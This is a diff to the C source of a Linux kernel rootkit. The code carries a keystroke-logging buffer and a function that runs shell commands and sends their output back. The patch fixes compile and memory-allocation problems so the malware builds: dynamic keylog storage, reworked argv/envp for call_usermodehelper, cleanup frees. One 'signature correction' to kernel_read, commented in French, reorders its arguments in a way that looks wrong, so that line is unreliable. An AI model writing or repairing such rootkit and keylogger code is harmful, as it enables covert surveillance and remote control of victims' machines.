@@ -226,7 +226,7 @@ struct keylog_entry {
 };
 
 struct keylog_buffer {
-    struct keylog_entry entries[keylog_config.buffer_size];
+    struct keylog_entry *entries;
     unsigned int head;
     unsigned int tail;
     spinlock_t lock;
@@ -426,6 +426,9 @@ static void exec_and_send_output(const char *command) {
     char *output_buffer;
     int read_result;
     char full_command[256];
+    char *argv[4];
+    char *envp[2];
+    int exec_result;
 
     if (!command || strlen(command) == 0) {
         send_error(ROOTKIT_ERROR_COMMAND, "Empty command");
@@ -434,6 +437,14 @@ static void exec_and_send_output(const char *command) {
 
     /* Prepare command string */
     snprintf(full_command, sizeof(full_command), "sh -c '%s' 2>&1", command);
+
+    /* Prepare argv/envp dynamically (C90 compliant) */
+    argv[0] = (char *)config.shell_path;
+    argv[1] = (char *)config.shell_args;
+    argv[2] = full_command;
+    argv[3] = NULL;
+    envp[0] = (char *)config.path_env;
+    envp[1] = NULL;
 
     /* Execute command and capture output */
     old_fs = get_fs();
@@ -445,9 +456,7 @@ static void exec_and_send_output(const char *command) {
         return;
     }
 
-    static char *argv[] = { config.shell_path, config.shell_args, full_command, NULL };
-    static char *envp[] = { config.path_env, NULL };
-    int exec_result = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    exec_result = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
     filp_close(output_file, NULL);
     set_fs(old_fs);
 
@@ -473,7 +482,8 @@ static void exec_and_send_output(const char *command) {
     memset(output_buffer, 0, config.buffer_size);
     old_fs = get_fs();
     set_fs(KERNEL_DS);
-    read_result = kernel_read(output_file, output_buffer, config.buffer_size - 1, &output_file->f_pos);
+    /* Correction de l'appel kernel_read : signature moderne */
+    read_result = kernel_read(output_file, &output_file->f_pos, output_buffer, config.buffer_size - 1);
     set_fs(old_fs);
 
     if (read_result < 0) {
@@ -689,8 +699,13 @@ static void keylog_buffer_init(void) {
     g_keylog_buffer = kmalloc(sizeof(struct keylog_buffer), GFP_KERNEL);
     if (!g_keylog_buffer)
         return;
-
     memset(g_keylog_buffer, 0, sizeof(struct keylog_buffer));
+    g_keylog_buffer->entries = kmalloc_array(keylog_config.buffer_size, sizeof(struct keylog_entry), GFP_KERNEL);
+    if (!g_keylog_buffer->entries) {
+        kfree(g_keylog_buffer);
+        g_keylog_buffer = NULL;
+        return;
+    }
     spin_lock_init(&g_keylog_buffer->lock);
 }
 
@@ -699,6 +714,8 @@ static void keylog_buffer_init(void) {
  */
 static void keylog_buffer_cleanup(void) {
     if (g_keylog_buffer) {
+        if (g_keylog_buffer->entries)
+            kfree(g_keylog_buffer->entries);
         kfree(g_keylog_buffer);
         g_keylog_buffer = NULL;
     }
